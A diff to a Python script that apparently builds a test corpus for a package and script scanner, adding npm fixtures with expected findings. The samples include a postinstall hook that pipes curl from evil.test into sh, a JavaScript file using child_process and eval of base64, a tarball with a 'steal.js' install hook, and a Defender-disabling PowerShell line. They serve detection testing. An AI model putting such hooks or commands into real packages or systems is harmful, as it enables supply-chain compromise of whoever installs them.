@@ -29,6 +29,7 @@ PDF_DIR    = os.path.join(CORPUS_DIR, 'pdf')
 OFFICE_DIR = os.path.join(CORPUS_DIR, 'office')
 SHELL_DIR  = os.path.join(CORPUS_DIR, 'shell')
 PS_DIR     = os.path.join(CORPUS_DIR, 'powershell')
+NPM_DIR    = os.path.join(CORPUS_DIR, 'npm')
 os.makedirs(PYTHON_DIR, exist_ok=True)
 os.makedirs(NATIVE_DIR, exist_ok=True)
 os.makedirs(PYSRC_DIR, exist_ok=True)
@@ -38,9 +39,12 @@ os.makedirs(PDF_DIR, exist_ok=True)
 os.makedirs(OFFICE_DIR, exist_ok=True)
 os.makedirs(SHELL_DIR, exist_ok=True)
 os.makedirs(PS_DIR, exist_ok=True)
+for sub in ('clean', 'malicious', 'js', 'tarball', 'locked'):
+    os.makedirs(os.path.join(NPM_DIR, sub), exist_ok=True)
 
 RANDOM_SEED   = 13371337
 FIXED_ZIP_DT  = (2026, 1, 1, 0, 0, 0)
+FIXED_EPOCH   = 1767225600   # 2026-01-01 UTC, for deterministic tar mtimes
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -462,6 +466,55 @@ write_text(os.path.join(PS_DIR, 'defender.ps1'),
     'Set-MpPreference -DisableRealtimeMonitoring $true\n')
 
 # ─────────────────────────────────────────────────────────────────────────────
+# npm fixtures (v0.6)
+# ─────────────────────────────────────────────────────────────────────────────
+import tarfile as _tarfile
+
+# Clean package.json — only normal scripts, no install hooks
+write_text(os.path.join(NPM_DIR, 'clean', 'package.json'),
+    json.dumps({"name": "clean-pkg", "version": "1.0.0",
+                "scripts": {"build": "tsc", "test": "jest"}}, indent=2))
+
+# Malicious package.json — postinstall fetch-and-exec (the #1 npm vector)
+_malicious_pkg = {
+    "name": "evil-pkg", "version": "1.0.0",
+    "scripts": {
+        "postinstall": "node -e \"require('child_process').exec('curl http://evil.test/x | sh')\"",
+        "build": "tsc",
+    },
+    "bin": {"evil": "./cli.js"},
+}
+write_text(os.path.join(NPM_DIR, 'malicious', 'package.json'),
+           json.dumps(_malicious_pkg, indent=2))
+
+# JavaScript fixtures
+write_text(os.path.join(NPM_DIR, 'js', 'evil.js'),
+    "const cp = require('child_process');\n"
+    "cp.exec('whoami');\n"
+    "eval(globalThis.atob('cGF5bG9hZA=='));\n")
+write_text(os.path.join(NPM_DIR, 'js', 'clean.js'),
+    "function add(a, b) {\n  return a + b;\n}\nmodule.exports = { add };\n")
+
+# npm tarball (.tgz) — package/package.json with a postinstall hook
+_tgz = os.path.join(NPM_DIR, 'tarball', 'evil_pkg-1.0.0.tgz')
+_pjbytes = json.dumps({"name": "evil-tarball", "version": "1.0.0",
+    "scripts": {"postinstall": "node ./steal.js"}}, indent=2).encode('utf-8')
+with _tarfile.open(_tgz, 'w:gz') as tf:
+    info = _tarfile.TarInfo('package/package.json'); info.size = len(_pjbytes); info.mtime = FIXED_EPOCH
+    tf.addfile(info, io.BytesIO(_pjbytes))
+print(f'  wrote {_tgz}')
+
+# Lockfile with a known-vulnerable exact version (for the online OSV layer).
+# lodash 4.17.4 has multiple published advisories in OSV.
+write_text(os.path.join(NPM_DIR, 'locked', 'package.json'),
+    json.dumps({"name": "locked-pkg", "version": "1.0.0",
+                "dependencies": {"lodash": "4.17.4"}}, indent=2))
+write_text(os.path.join(NPM_DIR, 'locked', 'package-lock.json'),
+    json.dumps({"name": "locked-pkg", "version": "1.0.0", "lockfileVersion": 3,
+                "packages": {"": {"name": "locked-pkg", "version": "1.0.0"},
+                             "node_modules/lodash": {"version": "4.17.4"}}}, indent=2))
+
+# ─────────────────────────────────────────────────────────────────────────────
 # Manifest
 # ─────────────────────────────────────────────────────────────────────────────
 manifest = {
@@ -510,6 +563,12 @@ manifest = {
         "powershell/encoded.ps1":    {"expectFinding": "PS-ENCODED-COMMAND"},
         "powershell/amsi.ps1":       {"expectFinding": "PS-AMSI-TAMPER"},
         "powershell/defender.ps1":   {"expectFinding": "PS-DEFENDER-TAMPER"},
+        "npm/clean/package.json":      {"expectLifecycle": False},
+        "npm/malicious/package.json":  {"expectFinding": "NPM-LIFECYCLE-SCRIPT"},
+        "npm/js/evil.js":              {"expectFinding": "NPM-JS-CHILD-PROCESS"},
+        "npm/js/clean.js":             {"expectRiskyCode": False},
+        "npm/tarball/evil_pkg-1.0.0.tgz": {"expectFinding": "NPM-LIFECYCLE-SCRIPT"},
+        "npm/locked/package-lock.json":{"expectOsvOnline": True},
     }
 }
 with open(os.path.join(CORPUS_DIR, 'manifest.json'), 'w') as f:
